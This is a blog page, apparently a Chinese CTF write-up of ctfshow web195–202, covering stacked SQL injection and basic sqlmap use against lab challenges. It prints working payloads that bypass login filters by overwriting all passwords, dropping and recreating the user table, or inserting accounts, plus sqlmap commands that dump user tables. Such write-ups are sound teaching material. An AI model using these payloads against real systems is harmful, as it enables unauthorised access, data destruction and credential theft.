@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web195堆叠注入专题开始堆叠注入会比联合查询有更多的权限，可以增删改查 过滤了select，单双引号也被过滤，没有报错提示。 没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。 密码也只能是数字 通过提供的查询语句可以知道表名是ctfshow_user，列名为username和pass。考虑用update把所有pass改成1。 1username&#x3D;1;u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web195-202">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/04/07/web195-202/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web195堆叠注入专题开始堆叠注入会比联合查询有更多的权限，可以增删改查 过滤了select，单双引号也被过滤，没有报错提示。 没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。 密码也只能是数字 通过提供的查询语句可以知道表名是ctfshow_user，列名为username和pass。考虑用update把所有pass改成1。 1username&#x3D;1;u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250407191803318.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250407192545998.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250407193104327.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408121231273.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408122112712.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408122343052.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408122458949.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408122647114.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408122928859.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408123250939.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408123557221.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408123838511.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408124245102.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408124452746.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408125910932.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408130530277.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250408130835384.png">
+<meta property="article:published_time" content="2025-04-07T11:11:17.000Z">
+<meta property="article:modified_time" content="2025-04-08T05:08:39.212Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/04/07/web195-202/file-20250407191803318.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web195-202</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/04/web187-194/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/04/07/web195-202/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&text=web195-202"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&is_video=false&description=web195-202"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web195-202&body=Check out this article: https://youngking-gfy.github.io/2025/04/07/web195-202/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&name=web195-202&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/04/07/web195-202/&t=web195-202"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web195"><span class="toc-number">1.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web196"><span class="toc-number">2.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web197"><span class="toc-number">3.</span> <span class="toc-text">web197</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web198"><span class="toc-number">4.</span> <span class="toc-text">web198</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-1"><span class="toc-number">4.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web199"><span class="toc-number">5.</span> <span class="toc-text">web199</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web200"><span class="toc-number">6.</span> <span class="toc-text">web200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web201"><span class="toc-number">7.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web202"><span class="toc-number">8.</span> <span class="toc-text">web202</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web195-202
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-07T11:11:17.000Z" class="dt-published" itemprop="datePublished">2025-04-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h3><p>堆叠注入专题开始<br><img src="/2025/04/07/web195-202/file-20250407191803318.png"><br>堆叠注入会比联合查询有更多的权限，可以增删改查</p>
+<p>过滤了select，单双引号也被过滤，没有报错提示。</p>
+<p>没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。</p>
+<p>密码也只能是数字</p>
+<p>通过提供的查询语句可以知道表名是ctfshow_user，列名为username和pass。<br>考虑用update把所有pass改成1。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>之后密码输1即可<br><img src="/2025/04/07/web195-202/file-20250407192545998.png"></p>
+<h3 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h3><p><img src="/2025/04/07/web195-202/file-20250407193104327.png"></p>
+<p>用户名长度受限，（本题没有select过滤）</p>
+<p>判断条件满足的设定是<code>$row[0]==$password</code>，<code>$row</code>存储的是结果集中的一行数据，<code>$row[0]</code>就是这一行的第一个数据。<br>既然可以堆叠注入，就是可以多语句查询，<code>$row</code>应该也会逐一循环获取每个结果集。</p>
+<p>那么可以输入username为<code>1;select(1)</code>，password为1。当<code>$row</code>获取到第二个查询语句<code>select(1)</code>的结果集时，即可获得&#96;$row[0]&#x3D;1，那么password输入1就可以满足条件判断。</p>
+<blockquote>
+<p>多语句查询情况下，<code>$row</code>应该也会逐一循环获取每个结果集</p>
+</blockquote>
+<p><img src="/2025/04/07/web195-202/file-20250408121231273.png"></p>
+<h3 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h3><p><img src="/2025/04/07/web195-202/file-20250408122112712.png"></p>
+<p><code>select</code>被正常过滤<br>两种堆叠注入方法</p>
+<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一</strong>：</h4><p>利用<code>show</code>。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过<code>show tables</code>，获取表名的结果集，在这个结果集里定然有一行的数据为ctfshow_user。</p>
+<p>用户名：<code>1;show tables</code><br>密码：<code>ctfshow_user</code></p>
+<p><img src="/2025/04/07/web195-202/file-20250408122343052.png"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>更新表。过滤了update，但我们可以删表，重新建一个同样表名的表，列名给的查询语句也已经告知，分别是username和pass。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));insert ctfshow_user(`username`,`pass`) value(1,1)</span><br></pre></td></tr></table></figure>
+
+<p>直接输1，1即可<br><img src="/2025/04/07/web195-202/file-20250408122458949.png"></p>
+<h3 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h3><p><img src="/2025/04/07/web195-202/file-20250408122647114.png"></p>
+<p>禁止删表、建表、更新表等</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><code>show tables</code></p>
+<p><img src="/2025/04/07/web195-202/file-20250408122928859.png"></p>
+<h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>可以用<code>insert</code></p>
+<p><code>1;insert ctfshow_user(username, pass) values(1,1)</code></p>
+<p><img src="/2025/04/07/web195-202/file-20250408123250939.png"></p>
+<h3 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h3><p><img src="/2025/04/07/web195-202/file-20250408123557221.png"></p>
+<p><code>show tables</code>直接出</p>
+<p><img src="/2025/04/07/web195-202/file-20250408123838511.png"></p>
+<h3 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h3><p>多了逗号过滤，其实不影响<br><img src="/2025/04/07/web195-202/file-20250408124245102.png"></p>
+<p><code>show tables</code>直接出</p>
+<p><img src="/2025/04/07/web195-202/file-20250408124452746.png"></p>
+<h3 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开始系统练习sqlmap的使用</span><br></pre></td></tr></table></figure>
+
+<p>题目有提到 <strong>使用–user-agent 指定agent</strong>，因为对于 sqlmap 默认的 user-agent 会包含 sqlmap <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%85%B3%E9%94%AE%E5%AD%97&spm=1001.2101.3001.7020">关键字</a>，很多时候我们会使用 –random-agent 来随机 ua 头。</p>
+<p>题目要求还需要使用–<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=referer&spm=1001.2101.3001.7020">referer</a> 绕过referer检查，referer 就是请求来自哪里，这里我们的请求其实是来自题目的地址：</p>
+<p>基本操作参考下述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --dbs</span><br><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -D &#x27;security&#x27; -T &#x27;users&#x27; --tables</span><br></pre></td></tr></table></figure>
+
+<p><code>python sqlmap.py -u &quot;http://18993da1-ffad-4dce-bb81-6cfa417a4696.challenge.ctf.show/api/?id=1&quot; --user-agent &quot;sqlmap&quot; --referer &quot;http://18993da1-ffad-4dce-bb81-6cfa417a4696.challenge.ctf.show/sqlmap.php&quot; -t 20 --dump -T ctfshow_user -D ctfshow_web</code></p>
+<p><img src="/2025/04/07/web195-202/file-20250408125910932.png"></p>
+<h3 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h3><p><img src="/2025/04/07/web195-202/file-20250408130530277.png"></p>
+<p>这里使用 –data 指定参数进行 post 请求的注入：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">2</span>c26e425-<span class="number">8</span>ba4-<span class="number">4610</span>-<span class="number">9</span>f63-<span class="number">7094</span>e75b410a.challenge.ctf.show/api/ --data id=<span class="number">1</span> --referer http://<span class="number">2</span>c26e425-<span class="number">8</span>ba4-<span class="number">4610</span>-<span class="number">9</span>f63-<span class="number">7094</span>e75b410a.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user -C id,pass,username --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/07/web195-202/file-20250408130835384.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web195"><span class="toc-number">1.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web196"><span class="toc-number">2.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web197"><span class="toc-number">3.</span> <span class="toc-text">web197</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web198"><span class="toc-number">4.</span> <span class="toc-text">web198</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-1"><span class="toc-number">4.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web199"><span class="toc-number">5.</span> <span class="toc-text">web199</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web200"><span class="toc-number">6.</span> <span class="toc-text">web200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web201"><span class="toc-number">7.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web202"><span class="toc-number">8.</span> <span class="toc-text">web202</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/04/07/web195-202/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&text=web195-202"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&is_video=false&description=web195-202"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web195-202&body=Check out this article: https://youngking-gfy.github.io/2025/04/07/web195-202/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&title=web195-202"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/04/07/web195-202/&name=web195-202&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/04/07/web195-202/&t=web195-202"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
